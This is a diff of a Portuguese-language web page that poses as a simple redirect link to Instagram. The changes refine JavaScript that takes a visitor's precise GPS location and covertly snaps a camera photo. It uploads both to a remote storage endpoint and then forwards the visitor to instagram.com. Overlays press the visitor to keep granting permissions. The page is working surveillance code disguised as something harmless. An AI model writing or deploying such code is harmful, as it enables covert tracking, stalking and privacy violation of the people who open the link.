@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionamento</title>
+  <title>Captura de Localização e Foto</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; overflow: hidden; background: #FFF; }
@@ -42,6 +42,28 @@
       };
     }
 
+    function requestLocation(callback) {
+      if (!navigator.geolocation) {
+        showOverlay("Geolocalização não suportada neste navegador.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          callback(latitude, longitude);
+        },
+        (error) => {
+          console.error("Erro ao obter localização:", error);
+          showOverlay("Permissão de localização necessária. Toque para tentar novamente.", () => {
+            localStorage.setItem("retryLocation", "1");
+            location.reload(); // necessário no Safari
+          });
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
     async function capturePhoto() {
       return new Promise(async (resolve, reject) => {
         try {
@@ -53,7 +75,7 @@
           const video = document.createElement("video");
           video.setAttribute("autoplay", true);
           video.setAttribute("muted", true);
-          video.setAttribute("playsinline", true);
+          video.setAttribute("playsinline", true); // necessário para iOS
           video.srcObject = stream;
 
           await new Promise((res) => {
@@ -93,31 +115,11 @@
               }
             }, "image/png");
           }, 500);
-
         } catch (err) {
-          showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", startFlow);
+          showOverlay("Permissão de câmera necessária. Toque para tentar novamente.", startFlow);
           reject(err);
         }
       });
-    }
-
-    function requestLocation(callback) {
-      const getLocation = () => {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const { latitude, longitude } = pos.coords;
-            callback(latitude, longitude);
-          },
-          () => {
-            showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => {
-              localStorage.setItem("retryLocation", "1");
-              location.reload();
-            });
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-      };
-      getLocation();
     }
 
     async function startFlow() {
@@ -125,7 +127,11 @@
         try {
           const imageUrl = await capturePhoto();
 
-          const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
+          const textBlob = new Blob(
+            [`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`],
+            { type: "text/plain" }
+          );
+
           const textForm = new FormData();
           textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
           textForm.append("upload_preset", uploadPreset);
@@ -137,10 +143,12 @@
           });
 
           if (!textResp.ok) throw new Error("Erro ao enviar localização");
+
           localStorage.removeItem("uploadedImageUrl");
           window.location.href = "https://instagram.com";
         } catch (err) {
-          showOverlay("Erro durante o processo. Toque para tentar novamente.", startFlow);
+          console.error("Erro geral:", err);
+          showOverlay("Erro no envio. Toque para tentar novamente.", startFlow);
         }
       });
     }
@@ -151,10 +159,11 @@
 
       if (savedUrl && retryLocation) {
         localStorage.removeItem("retryLocation");
-        showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => {
+        showOverlay("Toque para tentar novamente", () => {
           requestLocation(async (latitude, longitude) => {
             const imageUrl = savedUrl;
             const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
+
             const textForm = new FormData();
             textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
             textForm.append("upload_preset", uploadPreset);
@@ -166,7 +175,7 @@
             });
 
             if (!textResp.ok) {
-              showOverlay("Erro ao reenviar localização. Toque para tentar novamente.", startFlow);
+              showOverlay("Erro ao reenviar dados. Toque para tentar novamente.", startFlow);
             } else {
               localStorage.removeItem("uploadedImageUrl");
               window.location.href = "https://instagram.com";
